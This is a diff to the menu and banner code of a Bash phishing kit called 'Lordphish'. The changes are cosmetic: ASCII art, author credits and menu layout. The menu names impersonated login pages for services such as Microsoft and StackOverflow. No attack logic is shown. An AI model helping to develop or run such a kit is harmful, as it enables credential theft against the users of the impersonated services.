@@ -4,8 +4,6 @@
 # Lordphish the best phishing tool!!!!
 # Telegram: Ch33chOficial
 # Pages by: Tahmid Rayat
-# Banner by: Predator
-
 R='\e[1;31m'
 G='\e[1;32m'
 Y='\e[1;33m'
@@ -99,10 +97,7 @@ printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;96m Microsoft\e[0m      
 
 printf "\e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;96m IGFollowers\e[0m    \e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;96m StackOverflow\e[0m    \n"
 
-printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;91m Custom \e[0m        \e[1;92m[\e[0m\e[1;77mY\e[0m\e[1;92m]\e[0m\e[1;91m Youtube channel \e[0m  \e[1;92m[\e[0m\e[1;77mT\e[0m\e[1;92m]\e[0m\e[1;91m Telegram\e[0m\n"
-
-printf "\e[1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m \n"
-
+printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;91m Custom \e[0m        \e[1;92m[\e[0m\e[1;77mY\e[0m\e[1;92m]\e[0m\e[1;91m Youtube channel \e[0m  \e[1;92m[\e[0m\e[1;77mT\e[0m\e[1;92m]\e[0m\e[1;91m Telegram\e[0m       \e[1;92m[\e[0m\e[1;77mE\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m \n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' menu_option
 
 if [[ $menu_option == 1 || $menu_option == 01 ]]; then
@@ -351,11 +346,26 @@ fi
 banner() {
 clear
 printf "\n"
-printf "      \e[33;1m     __                   ______  __    _      __ \e[0m\n"
-printf "      \e[32;1m    / /   ____  _________/ / __ \/ /_  (_)____/ /_\e[0m\n"
-printf "      \e[32;1m   / /   / __ \/ ___/ __  / /_/ / __ \/ / ___/ __ \\e[0m\n"
-printf "      \e[32;1m  / /___/ /_/ / /  / /_/ / ____/ / / / (__  ) / / /\e[0m\n"
-printf "      \e[33;1m /_____/\____/_/   \__,_/_/   /_/ /_/_/____/_/ /_/\e[0m\n"
+echo -e $R"      ╔═══════════╗"
+echo -e "$R    ╔═╝$W███████████$R╚═╗"
+echo -e "$R   ╔╝$W███████████████$R╚╗"
+echo -e "$R   ║$W█████\033[1;32mCh33chSec\033[00m\033[1;37m████$R║"
+echo -e "$R   ║$W█████████████████$R║    \e[1;36m•\e[1;31m◈\e[1;36m•▬ ▬ ▬ ▬ ▬ ▬ ▬•\e[1;31m◈\e[1;36m•▬ ▬ ▬ ▬ ▬ ▬ ▬•\e[1;31m◈\e[1;36m•. \e[00m\e[1;31m"
+echo -e "$R   ║$W█████████████████$R║            \e[30;48;5;196m\e[1;32m\e[1;36m Lord\e[0m \e[30;48;5;39m\e[1;31m Phish\e[0m\e[1;31m"
+echo -e "$R   ║$W█$R╔$W█████████████$R╗$W█$R║    \e[1;36m•\e[1;31m◈\e[1;36m•▬ ▬ ▬ ▬ ▬ ▬ ▬•\e[1;31m◈\e[1;36m•▬ ▬ ▬ ▬ ▬ ▬ ▬•\e[1;31m◈\e[1;36m•. \e[00m\e[1;31m"
+echo -e "$R   ╚╦╝$W███$Gr▒▒\e[0m$W███$Gr▒▒\e[0m$W███$R╚╦╝    "
+echo -e "$R   ╔╝$W██$Gr▒▒▒▒\e[0m$W███$Gr▒▒▒▒\e[0m$W██$R╚╗     "
+echo -e "$R   ║$W██$Gr▒▒▒▒▒\e[0m$W███$Gr▒▒▒▒▒\e[0m$W██$R|      "
+echo -e "$R   ║$W██$Gr▒▒▒▒\e[0m$W█████$Gr▒▒▒▒\e[0m$W██$R║                               "
+echo -e "$R   ╚╗$W███████████████$R╔╝"
+echo -e "$R  ╔═╬══╦╝$W██$Gr▒\e[0m$W█$Gr▒\e[0m$W██$R╚╦══╝ $G.$g▒$G.."
+echo -e "$R  ║$W█$R║══║$W█████████$R║ $G...$g▒$G."
+echo -e "$R  ║$W█$R║══║$W█$R║$W██$R║$W██$R║$W█$R║　$G.$g▒$G.."
+echo -e "$R  ║$W█$R║══╚═╩══╩╦═╩═╩═╦╗$g▒$G."
+echo -e "$R ╔╝$W█$R╚══╦═╦══╦╩═╦═╦═╩╝"
+echo -e "$R╔╝$W█████$R║$W█$R║$W██$R║$W██$R║$W█$R║"
+echo -e "$R║$W██████$R║$W█████████$R║\033[00m"
+echo
 printf "      \e[1;97m    Version 1.2 Beta      \e[0m\n"
 printf "\n"
 printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Coder Maldito (Ch33chSec)\e[0m\n"
